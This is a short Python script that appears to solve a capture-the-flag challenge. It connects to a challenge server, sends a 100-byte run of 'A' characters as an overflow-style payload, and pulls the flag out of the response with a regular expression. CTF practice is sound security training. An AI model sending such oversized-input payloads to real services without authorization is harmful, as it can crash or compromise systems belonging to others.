import re
import socket


# Connect to challenge endpoint and receive banner
server_address = ('E09-target.allyourbases.co', 8149)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(server_address)
data: bytes = sock.recv(1024)

# Send payload and receive response
sock.send(b"A" * 100)
data: bytes = sock.recv(1024)
data: str = data.decode('utf-8')

# Extract flag from response
pattern = r"Flag\[\w+\]"
result = re.search(pattern, data)
flag = result.group(0)
print(f"[*] Got the flag: {flag}")
